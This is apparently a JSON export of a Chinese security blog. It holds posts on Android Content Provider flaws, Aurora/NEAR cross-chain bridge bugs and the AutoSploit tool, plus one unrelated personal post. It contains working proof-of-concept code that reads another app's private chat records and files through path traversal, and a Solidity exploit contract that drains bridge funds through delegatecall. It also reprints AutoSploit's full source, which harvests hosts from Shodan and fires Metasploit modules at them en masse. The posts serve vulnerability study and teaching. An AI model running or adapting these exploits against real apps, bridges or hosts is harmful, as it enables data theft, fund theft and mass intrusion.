用来存放和获取数据并使这些数据可以被所有的应用程序访问，是应用程序之间共享数据的唯一方法\ne.g. 一只眼app应用本地信息泄露任意Android程序不需要任何权限就能获取本机一支眼app的所有数据，包括账号、私信聊天记录\n查看聊天记录POC\npublic void getChatMsg() &#123;    \tString[] projection = &#123;&quot;* from im_message_table--&quot;&#125;;    \tUri uri = Uri.parse(&quot;content://com.sina.weibo.blogProvider/query/im&quot;);    \tCursor mCursor = getContentResolver().query(uri, projection, null, null, null);    \tif (null == mCursor) &#123;    \t\tToast.makeText(mContext, &quot;null cursor&quot;, Toast.LENGTH_SHORT).show();    \t&#125; else if (mCursor.getCount() &lt; 1) &#123;    \t\tToast.makeText(mContext, &quot;count less than 1&quot;, Toast.LENGTH_SHORT).show();    \t&#125; else &#123;    \t\tString text = &quot;&quot;;    \t\twhile (mCursor.moveToNext()) &#123;    \t        text += mCursor.getString(mCursor.getColumnIndex(&quot;content&quot;));    \t    &#125;    \t\tmTextView.setText(text);    \t&#125;    &#125;\n\n7、任意文件读取漏洞e.g. 某客户端Content Provider组件任意文件读取漏洞某客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=”true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../“实现目录跨越，实现对任意私有数据的访问\nPOC\npublic void GJContentProviderFileOperations()&#123;     try&#123; \t    InputStream in = getContentResolver().openInputStream(Uri.parse(&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;)); \t\tByteArrayOutputStream out = new ByteArrayOutputStream(); \t\tbyte[] buffer = new byte[1024]; \t\tint n = in.read(buffer); \t\twhile(n&gt;0)&#123; \t\t    out.write(buffer, 0, n); \t\t\tn = in.read(buffer); \t\t\tToast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); \t    &#125; \t&#125;catch(Exception e)&#123; \t    debugInfo(e.getMessage()); \t&#125; &#125;\n漏洞详解\n8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）存在一个私有组件A，和一个对外导出组件B。如果B能够根据对外传入的Intent中的内容打开私有组件A，同时启动私有组件A的Intent的内容来自启动导出组件B的Intent的内容，那么攻击者就可以通过对外导出组件B，去控制私有导出组件A。这就可能会造成严重的安全风险这里详细的看下聚安全的这篇paper\n其实还有很多没有列出，如UXSS、界面劫持、services劫持等等0x04 简单自测1、反编译APK或直接查看源代码查看AndroidManifest.xml文件，查看哪些组件是导出的，仔细check是否需要导出，需要导出的是否都已做了相应的安全限制\n2、drozer扫描run app.activity.info -a packagename\n0x05 防患于未然1、能不导出组件的坚决不导出2、必须导出的组件仔细check限制策略是否到位3、检查该组件能不能根据该组件的intent去启动其他私有组件4、如果能启动私有组件，根据业务严格控制过滤和校验intent中的内容，同时被启动的私有组件需要做好各种安全防范\n\n\n关于漏洞例子：本来想用最近遇到的问题来做实例，但考虑到漏洞的敏感性，找的是网上公开的漏洞\n\n\n","categories":["移动安全"],"tags":["Mobi"]},{"title":"AV Pro治好了我的电子ED","url":"/Apple%20Vision%20Pro%E6%B2%BB%E5%A5%BD%E4%BA%86%E6%88%91%E7%9A%84%E7%94%B5%E5%AD%90ED/","content":"不知道在多久以前，我发现自己ED了，当然是电子的(不过刚阳完，硬件还行不行说不准了)，无论是游戏还是电子设备，都突然失去了兴趣。\n举几个例子，买了十几张NS游戏，可是几乎都没玩超过1小时，现在家里的两台电脑还分别是垃圾桶Mac Pro 2013和Mac mini 2012。\n生活中最简单能满足欲望获得快感的路突然就那么消失了，再也没有回来。\n但是，今天，看到了康复的可能，那就是AV Pro。\n非常震撼，仿佛从梦中走到现实，期待了非常非常久的一款产品，久到都对它在近几年发布不抱幻想，然而它就这么来了，而且完成度这么高，超预期的惊喜。\n现在已经非常宅，可以预想到，等它到手，估计就很难迈出家门了。\nGame、Sex…\n等到生态起来后，想想都能笑醒（不过Sex国区估计没戏，等一个越狱补丁）。\n没啥好说的了，首发，冲。\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"Aurora 跨链桥销毁逻辑错误导致无ETH膨胀漏洞","url":"/Aurora%20%E8%B7%A8%E9%93%BE%E6%A1%A5%E9%94%80%E6%AF%81%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%97%A0ETH%E8%86%A8%E8%83%80%E6%BC%8F%E6%B4%9E/","content":"Aurora EVM 最初由 NEAR 内部开发，是 NEAR 生态系统的官方 EVM。它实现了与以太坊协议的 1:1 体验，包括采用 ETH 作为基础货币。除了基本范围之外，EVM 还允许进行额外的预编译。此类预编译使 EVM 能够与 NEAR 生态系统的其余部分进行交互。其中包括exitToNear和exitToEthereum(只能通过 NEP-141 到 ERC-20 合约访问)。\nexitToNear、exitToEthereum预编译只能从 Aurora EVM 自部署的 NEP-141 映射 ERC-20 合约中调用。这些 ERC-20 合约是通过调用deploy_erc20_token函数来部署的。https://doc.aurora.dev/evm/precompiles\n其中Aurora EVM转移代币到Near或着以太坊是以下两个预编译地址：\n0xe9217bc70b7ed1f598ddd3199e80b093fa71124f将 ETH 或 NEP-141 映射的 ERC-20 代币作为 NEP-141 从 Aurora EVM 转移到 Near。\n0xb0bd02f6a392af548bdf1cfaee5dfa0eefcc8eab通过Rainbow Bridge将 ETH 或 NEP-141 映射的 ERC-20 代币从 Aurora EVM 转移到以太坊。\n当flag是0x0时，Eth transfer\n\n当flag是0x1时，Erc20 transfer\n\n转移Erc20比转移Eth时，多了一步销毁的动作，这里将是问题的关键。\n\n在上图代码转移Erc20代币前，会先销毁代币，逻辑上没有问题。接下来看下转移Eth时的逻辑。\nexitToNear、exitToEthereum预编译的作用\nimpl ExitToNear &#123;    /// Exit to NEAR precompile address    ///    /// Address: `0xe9217bc70b7ed1f598ddd3199e80b093fa71124f`    /// This address is computed as: `&amp;keccak(&quot;exitToNear&quot;)[12..]`    pub const ADDRESS: Address =        super::make_address(0xe9217bc7, 0x0b7ed1f598ddd3199e80b093fa71124f);    pub fn new(current_account_id: AccountId) -&gt; Self &#123;        Self &#123; current_account_id &#125;    &#125;&#125;...impl Precompile for ExitToNear &#123;...        let (nep141_address, args, exit_event) = match flag &#123;            0x0 =&gt; &#123;                // ETH transfer                //                // Input slice format:                //      recipient_account_id (bytes) - the NEAR recipient account which will receive NEP-141 ETH tokens                if let Ok(dest_account) = AccountId::try_from(input) &#123;                    (                        current_account_id,                        // There is no way to inject json, given the encoding of both arguments                        // as decimal and valid account id respectively.                        format!(                            r#&quot;&#123;&#123;&quot;receiver_id&quot;: &quot;&#123;&#125;&quot;, &quot;amount&quot;: &quot;&#123;&#125;&quot;, &quot;memo&quot;: null&#125;&#125;&quot;#,                            dest_account,                            context.apparent_value.as_u128()                        ),                        events::ExitToNear &#123;                            sender: Address::new(context.caller),                            erc20_address: events::ETH_ADDRESS,                            dest: dest_account.to_string(),                            amount: context.apparent_value,                        &#125;,                    )                &#125; else &#123;                    return Err(ExitError::Other(Cow::from(                        &quot;ERR_INVALID_RECEIVER_ACCOUNT_ID&quot;,                    )));                &#125;...        let transfer_promise = PromiseCreateArgs &#123;            target_account_id: nep141_address,            method: &quot;ft_transfer&quot;.to_string(),            args: args.as_bytes().to_vec(),            attached_balance: Yocto::new(1),            attached_gas: costs::FT_TRANSFER_GAS,        &#125;;        #[cfg(feature = &quot;error_refund&quot;)]        let promise = PromiseArgs::Callback(PromiseWithCallbackArgs &#123;            base: transfer_promise,            callback: refund_promise,        &#125;);        #[cfg(not(feature = &quot;error_refund&quot;))]        let promise = PromiseArgs::Create(transfer_promise);        let promise_log = Log &#123;            address: Self::ADDRESS.raw(),            topics: Vec::new(),            data: promise.try_to_vec().unwrap(),        &#125;;        let exit_event_log = exit_event.encode();        let exit_event_log = Log &#123;            address: Self::ADDRESS.raw(),            topics: exit_event_log.topics,            data: exit_event_log.data,        &#125;;        Ok(PrecompileOutput &#123;            logs: vec![promise_log, exit_event_log],            ..Default::default()        &#125;        .into())\n\n如果标志是0x0，将生成一个事件“ExitToNear”，记录这个出口的“sender”，“dest”和“amount”，然后返回包含事件信息的’ exit_event_log ‘。\n这些日志以及执行期间的所有其他日志将由’ filter_promises_from_logs ‘检查。\nfn filter_promises_from_logs&lt;T, P&gt;(handler: &amp;mut P, logs: T) -&gt; Vec&lt;ResultLog&gt;where    T: IntoIterator&lt;Item = Log&gt;,    P: PromiseHandler,&#123;    logs.into_iter()        .filter_map(|log| &#123;            if log.address == ExitToNear::ADDRESS.raw()                || log.address == ExitToEthereum::ADDRESS.raw()            &#123;                if log.topics.is_empty() &#123;                    if let Ok(promise) = PromiseArgs::try_from_slice(&amp;log.data) &#123;                        match promise &#123;                            PromiseArgs::Create(promise) =&gt; schedule_promise(handler, &amp;promise),                            PromiseArgs::Callback(promise) =&gt; &#123;                                let base_id = schedule_promise(handler, &amp;promise.base);                                schedule_promise_callback(handler, base_id, &amp;promise.callback)                            &#125;                        &#125;;                    &#125;\n\n只要使用硬编码地址生成日志ExitTo(Near|Ethereum)::ADDRESS，log.data就会将其作为要安排的新承诺进行处理。\n因为log在AUrora上的验证只需要满足“是否由内置合约地址生成”以及“msg.value是否大于0“即可通过验证。\n第一个条件时天然达成的。\n要达成第二个条件，在这里利用DELEGATECALL来代替CALL进行调用合约(Aurora只禁用了STATICCALL却没有禁用DELEGATECALL)。\nDELEGATECALL与CALL的区别如下图\n\n当使用DELEGATECALL调用时，msg.data/msg.value只会进行值传递，却不会变化拥有者。\n所以这个漏洞的利用链就成熟了，如下：\n1.    在Aurora上部署恶意合约，通过DELEGATECALL去调用ExitToNear(0xe9217bc70b7ed1f598ddd3199e80b093fa71124f内置合约地址)\n2.    调用下述恶意代码，Aurora将被诱骗向Near上的调用方发送nETH，但是却不会销毁发起合约的代币，从而实现窃取\n\nExploit.sol// SPDX-License-Identifier: GPL-3.0pragma solidity ^0.8.7;contract Exploit &#123;    address payable private owner;    constructor() &#123;        owner = payable(msg.sender);    &#125;    function exploit(bytes memory recipient) public payable &#123;        require(msg.sender == owner);        bytes memory input = abi.encodePacked(&quot;\\x00&quot;, recipient);        uint input_size = 1 + recipient.length;        assembly &#123;            let res := delegatecall(gas(), 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f, add(input, 32), input_size, 0, 32)        &#125;        owner.transfer(msg.value);    &#125;&#125;\n\n3.    要保证恶意合约初始有部分余额，然后通过窃取-转回-再窃取的循环，指数爆炸，最终实现窃取所有代币\n\nhttps://medium.com/immunefi/aurora-infinite-spend-bugfix-review-6m-payout-e635d24273dhttps://pwning.mirror.xyz/CB4XUkbJVwPo7CaRwRmCApaP2DMjPQccW-NOcCwQlAs\n","categories":["区块链"],"tags":["漏洞分析"]},{"title":"Aurora输入处理不当导致费用窃取漏洞","url":"/Aurora%E8%BE%93%E5%85%A5%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E8%B4%B9%E7%94%A8%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/","content":"在aurora-engine 2.6.1版本，修复了一个Near跨链桥上的漏洞。\n\n在注释中有提到了大概的漏洞原理：Fixed the ability the steal funds from those by setting a fee when receiving NEP-141 as ERC-20。\n定位到漏洞代码入口处：\n\n根据之前注释中提到的原理，是在与ERC-20交互时产生的漏洞，跟踪receive_erc20_tokens这个方法\n\nreceive_erc20_tokens的入参除了&amp;AccountId外，还有&amp;NEP141FtOnTransferArgs，去看下这个参数的含义\n\n实现很简单，发送账号、余额、字符串。回到receive_erc20_tokens方法中，看下这三个参数分别做了什么。\n\n\n其中可以看到msg参数经过一系列的长度判断，判断recipient是否有效以及fee的判断。\n\n在进行相关字段的验证后，进行ERC-20 token获取\n\n\n\n之后进行fee的处理，如果fee不等于0，则将fee从recipient发送到relayer_address。\n此刻，如果relayer_address可控，fee可控，则可通过向ETH链上地址发送near代币，设置fee不为0，根据上文逻辑，将会从receiver将fee转到relayer_address。\n第一个条件：relayer_address可控\n\nrelayer_account_id是入参之一，天然可控，条件一达成。\n第二个条件：fee可控\n\n这里就需要NEP141FtOnTransferArgs了，从前文的逻辑中可以看到，amount也是入参，条件二达成。\n这时攻击者便可以在near上创建一个合约，然后不断构建NEP-141 -&gt; ERC20 的跨链请求，便可以不断的窃取ETH。\n参考：https://medium.com/immunefi/aurora-improper-input-sanitization-bugfix-review-a9376dac046f\nhttps://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a\n","categories":["区块链"],"tags":["漏洞分析"]},{"title":"Aurora销毁逻辑错误导致代币窃取漏洞","url":"/Aurora%E9%94%80%E6%AF%81%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E4%BB%A3%E5%B8%81%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/","content":"跨链桥-RainBow Bridge\nRainbow Bridge 不要求用户信任任何东西，除了区块链本身，称之为无信任。任何在 NEAR 上加密可证明的信息都可用于以太坊合约，反之亦然。\n例如以下信息：\n•    将交易包含在区块中；\n•    执行具有特定结果的交易；\n•    合约的状态。\n\n桥的设计桥背后的核心思想是它实现了两个轻客户端：     1.    作为 NEAR 合约在 Rust 中实现的以太坊轻客户端    2.    作为以太坊合约在 Solidity 中实现的 NEAR 轻客户端\n\n处理流程https://near.org/blog/eth-near-rainbow-bridge/\n1.    假设 Alice 想在 NEAR 区块链上将 X DAI 转给 Bob，她从 RainbowCLI/RainbowLib 发起转账；\n2.    RainbowLib 首先设置允许将 X DAI 从 Alice 转移到 TokenLocker；\n3.    然后它调用 TokenLocker 获取那些令牌，导致 TokenLocker 发出事件“Alice locked X tokens in favor of Bob”；\n4.    RainbowLib 然后等到 EthOnNearClient 收到包含此事件的以太坊标头，再加上 25 个区块进行确认；\n5.    然后 RainbowLib 计算这个事件的证明并提交给 MintableFungibleToken 合约；\n6.    MintableFungibleToken 合约然后通过调用 EthOnNearProver 来验证这个证明是否正确；\n    6.1.    EthOnNearProver 反过来验证证明的标头是否在 EthOnNearClient 的规范链上，并且它具有所需的确认次数。它还验证证明本身；\n    6.2.    MintableFungibleToken 然后解包以太坊事件并为 Bob 铸造 X nearDAI，完成转账。\n\n\n漏洞代码分析根据这个漏洞的基本信息，错误提交是漏洞的核心，先来看一下EthCustodian的withdraw函数是如何实现的。\n提取编码在’ proofData ‘中的适当数量的ETH，利用_parseAndConsumeProof对proofData进行解码。\nhttps://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F1#L116\n\nhttps://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F5#L45\nfunction _parseAndConsumeProof(        bytes memory proofData,         uint64 proofBlockHeight    )        internal        returns(ProofDecoder.ExecutionStatus memory result)    &#123;        require(            proofBlockHeight &gt;= minBlockAcceptanceHeight_,            &#x27;Proof is from the ancient block&#x27;        );        require(            prover_.proveOutcome(proofData,proofBlockHeight),            &#x27;Proof should be valid&#x27;        );        // Unpack the proof and extract the execution outcome.        Borsh.Data memory borshData = Borsh.from(proofData);        ProofDecoder.FullOutcomeProof memory fullOutcomeProof =         borshData.decodeFullOutcomeProof();                require(            borshData.finished(),            &#x27;Argument should be exact borsh serialization&#x27;        );        bytes32 receiptId =         fullOutcomeProof.outcome_proof.outcome_with_id.outcome.receipt_ids[0];        require(            !usedEvents_[receiptId],            &#x27;The burn event cannot be reused&#x27;        );        usedEvents_[receiptId] = true;        require(            keccak256(fullOutcomeProof.outcome_proof.outcome_with_id.outcome.executor_id) ==             keccak256(nearProofProducerAccount_),            &#x27;Can only withdraw coins from the linked proof producer on Near blockchain&#x27;        );        result = fullOutcomeProof.outcome_proof.outcome_with_id.outcome.status;        require(            !result.failed,             &#x27;Cannot use failed execution outcome for unlocking the tokens&#x27;        );        require(            !result.unknown,            &#x27;Cannot use unknown execution outcome for unlocking the tokens&#x27;        );    &#125;\n\n从这里keccak256(fullOutcomeProof.outcome_proof.outcome_with_id.outcome.executor_id) == keccak256(nearProofProducerAccount_)可以看到会校验executor_id和nearProofProducerAccount_是否相等，也就是eth和near对应的合约是否一致。\n从Aurora的代码里找到对应的部分看下如何实现的。\n\nlet mut executor = executor_params.make_executor(self);是这个漏洞的关键，可以看到Aurora将自己设置为了executor。\n这时候我们模拟流程看一下会发生什么。\n经过EthCustodian.sol初始处理后，会生成如下的数据包：\n\n包含了要发送的ETH数量、ETH的接收账户、执行此操作的地址。\nrequire(            result.ethCustodian == address(this),            &#x27;Can only withdraw coins that were expected for the current contract&#x27;        );\n\n在withdraw中验证result.ethCustodian是否等于BurnResult.ethCustodian，如果相等，则执行合约转账。\n当ETH侧发起转账时，Aurora侧withdraw_eth_from_near的会进行处理。\n\n同时重新定义了BurnResult数据结构如下：\n\n在 withdraw函数中直接调用了withdraw_eth_from_near函数，如下\n\n然后进一步跟踪withdraw_eth_from_near，最终在internal_withdraw_eth_from_near函数中实现了Near代币销毁。\n\n以上就是Near向ETH跨链发送代币的流程。\n那么如何利用漏洞来实现向ETH发送代币而不在Near链上销毁代币呢？\n在上文中分析过，ETH侧会判断执行者id和Aurora 合约发起地址匹配，如果可以将Aurora 合约发起地址设置为Aurora合约本身，就可以不需要销毁代币从而窃取ETH了。\n从Aurora的代码寻找会将自己设置为执行id的函数，在代码中我们找到三处，分别是deploy、call、view函数。\n\n所以攻击链就有了：\n0.    创建一个合约Evil进行跨链转币，进行数据封装\n0.    用view函数去调用Evil合约(理论上查看合约就可以触发)\n0.    这时候executor_id就是Aurora合约本身\n0.    自动化批量调用实现\n\n当前的修复方式是验证Evil中的EthCustodian是否等于Evil自身的EthCustodian。\n修复代码：\n\nhttps://medium.com/immunefi/aurora-withdrawal-logic-error-bugfix-review-c5b4e30a9160\nhttps://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a\nhttps://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code\n","categories":["区块链"],"tags":["漏洞分析"]},{"title":"AutoSploit的简单分析","url":"/AutoSploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/","content":"https://github.com/NullArray/AutoSploit\n简单看了下这个工具的源码，核心的关键代码分为两部分\n\n第一部分：通过shadon获取目标IP\n\napi = shodan.Shodan(SHODAN_API_KEY)\n\nresult = api.search(query)\nif clobber == True:    with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:        for i in xrange(toolbar_width):            time.sleep(0.1)            for service in result[&#x27;matches&#x27;]:                log.write(service[&#x27;ip_str&#x27;])                log.write(&quot;\\n&quot;)\n\n\n第二部分：通过MSF攻击目标IP\n\nif choice == &#x27;s&#x27;:    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:        for rhosts in host_list:            for exploit in sorted_modules:                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                workspace, local_host, local_port, rhosts, exploit)                os.system(template)elif choice == &#x27;a&#x27;:    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:        for rhosts in host_list:            for exploit in all_modules:                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                workspace, local_host, local_port, rhosts, exploit)                os.system(template)else:    print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;\n\n这个工具这样看起来并不复杂，但更重要的是学习作者的思路，利用简单的代码快速将常见的独立的工具结合起来，各取所长，实现快速自动化操作\n全部代码\n#!/usr/bin/env python2.7import osimport sysimport pickleimport timefrom subprocess import PIPE, Popenimport shodanfrom blessings import Terminalt = Terminal()# Global varsapi = &quot;&quot;query = &quot;&quot;workspace = &quot;&quot;local_port = &quot;&quot;local_host = &quot;&quot;configured = Falsetoolbar_width = 60# Logodef logo():    print t.cyan(&quot;&quot;&quot;                              _____     _       _____     _     _ _   #--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_ #--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|  #--Version: 1.0.0                                    |_|             ##############################################&quot;&quot;&quot;)# Usage and legal.def usage():    os.system(&quot;clear&quot;)    logo()    print &quot;&quot;&quot;+-----------------------------------------------------------------------+|            AutoSploit General Usage and Information                   |+-----------------------------------------------------------------------+|As the name suggests AutoSploit attempts to automate the exploitation  ||of remote hosts. Targets are collected by employing the Shodan.io API. ||                                                                       ||The &#x27;Gather Hosts&#x27; option will open a dialog from which you can        ||enter platform specific search queries such as &#x27;Apache&#x27; or &#x27;IIS&#x27;.      ||Upon doing so a list of candidates will be retrieved and saved to      ||hosts.txt in the current working directory.                            ||After this operation has been completed the &#x27;Exploit&#x27; option will      ||go about the business of attempting to exploit these targets by        ||running a range of Metasploit modules against them.                    ||                                                                       ||Workspace, local host and local port for MSF facilitated               ||back connections are configured through the dialog that comes up       ||before the &#x27;Exploit&#x27; module is started.                                ||                                                                       |+------------------+----------------------------------------------------+|     Option       |                   Summary                          |+------------------+----------------------------------------------------+|1. Usage          | Display this informational message.                ||2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  ||3. View Hosts     | Print gathered IPs/RHOSTS.                         ||4. Exploit        | Configure MSF and Start exploiting gathered targets||5. Quit           | Exits AutoSploit.                                  |+------------------+----------------------------------------------------+|                         Legal Disclaimer                              |+-----------------------------------------------------------------------+| Usage of AutoSploit for attacking targets without prior mutual consent| | is illegal. It is the end user&#x27;s responsibility to obey all applicable| | local, state and federal laws. Developers assume no liability and are || not responsible for any misuse or damage caused by this program!\t|+-----------------------------------------------------------------------+&quot;&quot;&quot;# Function that allows us to store system command# output in a variabledef cmdline(command):    process = Popen(        args=command,        stdout=PIPE,        shell=True    )    return process.communicate()[0]def exploit(query):    global workspace    global local_port    global local_host    os.system(&quot;clear&quot;)    logo()    sorted_modules = []    all_modules = []    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Sorting modules relevant to the specified platform.&quot;    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]This may take a while...\\n\\n\\n&quot;    # Progress bar    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))    sys.stdout.flush()    sys.stdout.write(&quot;\\b&quot; * (toolbar_width + 1))    with open(&quot;modules.txt&quot;, &quot;rb&quot;) as infile:        for i in xrange(toolbar_width):            time.sleep(0.1)            for lines in infile:                all_modules.append(lines)                if query in lines:                    sorted_modules.append(lines)            # update the bar            sys.stdout.write(&#x27;\\033[94m&#x27; + &quot;|&quot; + &#x27;\\033[0m&#x27;)            sys.stdout.flush()    print &quot;\\n\\n\\n[&quot; + t.green(&quot;+&quot;) + &quot;]AutoSploit sorted the following MSF modules based search query relevance.\\n&quot;    # Print out the sorted modules    for line in sorted_modules:        print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line    # We&#x27;ll give the user the option to run all modules in a &#x27;hail mary&#x27; type of attack or allow    # a more directed approach with the sorted modules.    choice = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Run sorted or all modules against targets? [S]orted/[A]ll: &quot;).lower()    if choice == &#x27;s&#x27;:        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:            for rhosts in host_list:                for exploit in sorted_modules:                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                    workspace, local_host, local_port, rhosts, exploit)                    os.system(template)    elif choice == &#x27;a&#x27;:        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:            for rhosts in host_list:                for exploit in all_modules:                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                    workspace, local_host, local_port, rhosts, exploit)                    os.system(template)    else:        print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;# Function to gather target hosts from Shodan def targets(clobber=True):    global query    os.system(&quot;clear&quot;)    logo()    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your platform specific search query.&quot;    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]I.E. &#x27;IIS&#x27; will return a list of IPs belonging to IIS servers.&quot;    while True:        query = raw_input(&quot;\\n&lt;&quot; + t.cyan(&quot;PLATFORM&quot;) + &quot;&gt;$ &quot;)        if query == &quot;&quot;:            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Query cannot be null.&quot;        else:            break    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please stand by while results are being collected...\\n\\n\\n&quot;    time.sleep(1)    try:        result = api.search(query)    except Exception as e:        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An error was raised with the following error message.\\n&quot;        print e        sys.exit(0)    # Setup progress bar    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))    sys.stdout.flush()    sys.stdout.write(&quot;\\b&quot; * (toolbar_width + 1))    if clobber == True:        with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:            for i in xrange(toolbar_width):                time.sleep(0.1)                for service in result[&#x27;matches&#x27;]:                    log.write(service[&#x27;ip_str&#x27;])                    log.write(&quot;\\n&quot;)                # update the bar                sys.stdout.write(&#x27;\\033[94m&#x27; + &quot;|&quot; + &#x27;\\033[0m&#x27;)                sys.stdout.flush()        hostpath = os.path.abspath(&quot;hosts.txt&quot;)        print &quot;\\n\\n\\n[&quot; + t.green(&quot;+&quot;) + &quot;]Done.&quot;        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Host list saved to &quot; + hostpath    else:        with open(&quot;hosts.txt&quot;, &quot;ab&quot;) as log:            for i in xrange(toolbar_width):                time.sleep(0.1)                for service in result[&#x27;matches&#x27;]:                    log.write(service[&#x27;ip_str&#x27;])                    log.write(&quot;\\n&quot;)        # update the bar        sys.stdout.write(&#x27;\\033[94m&#x27; + &quot;|&quot; + &#x27;\\033[0m&#x27;)        sys.stdout.flush()        hostpath = os.path.abspath(&quot;hosts.txt&quot;)        print &quot;\\n\\n\\n[&quot; + t.green(&quot;+&quot;) + &quot;]Done.&quot;        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Hosts appended to list at &quot; + hostpath# Function to define metasploit settingsdef settings():    global workspace    global local_port    global local_host    global configured    os.system(&quot;clear&quot;)    logo()    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]MSF Settings\\n&quot;    print &quot;In order to proceed with the exploit module some MSF&quot;    print &quot;settings need to be configured.&quot;    time.sleep(1.5)    print &quot;\\n[&quot; + t.green(&quot;+&quot;) + &quot;]Note.\\n&quot;    print &quot;Please make sure your Network is configured properly.\\n&quot;    print &quot;In order to handle incoming Reverse Connections&quot;    print &quot;your external Facing IP &amp; Port need to be reachable...&quot;    time.sleep(1.5)    workspace = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the Workspace name: &quot;)    if not workspace == &quot;&quot;:        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Workspace set to: &quot; + workspace    else:        workspace = False    local_host = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the local host: &quot;)    if not local_host == &quot;&quot;:        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Local host set to: &quot; + repr(local_host)    else:        local_host = False    local_port = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the local port: &quot;)    if not local_host == &quot;&quot;:        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Local port set to: &quot; + repr(local_port)    else:        local_port = False    # Check if settings are not null    if workspace == False or local_host == False or local_port == False:        configured = None        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. LPORT, LHOST and/or workspace cannot be null&quot;        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Restarting MSF Settings module.&quot;        time.sleep(1.5)    else:        # If everything has been properly configured we&#x27;re setting config var to true        # When we return to the main menu loop we will use it to check to see if we        # can skip the config stage. When the exploit component is run a second time        configured = True        if not os.path.isfile(&quot;hosts.txt&quot;):            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;            print &quot;In order for the exploit module to work, a host file needs to be&quot;            print &quot;present.&quot;        else:            # Call exploit function, the &#x27;query&#x27; argument contains the search strig provided            # in the &#x27;gather hosts&#x27; function. We will check this string against the MSF            # modules in order to sort out the most relevant ones with regards to the intended            # targets.            exploit(query)# Main menudef main():    global query    global configured    global api    try:        api = shodan.Shodan(SHODAN_API_KEY)    except Exception as e:        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. API setup failed.\\n&quot;        print e        sys.exit(0)    try:        while True:            # Make sure a misconfiguration in the MSF settings            # Doesn&#x27;t execute main menu loop but returns us to the            # appropriate function for handling those settings            if configured == None:                settings()            print &quot;\\n[&quot; + t.green(&quot;+&quot;) + &quot;]Welcome to AutoSploit. Please select an action.&quot;            print &quot;&quot;&quot;\t\t1. Usage\t\t3. View Hosts\t\t5. Quit2. Gather Hosts\t\t4. Exploit \t\t\t\t\t\t\t\t\t\t\t\t\t\t&quot;&quot;&quot;            action = 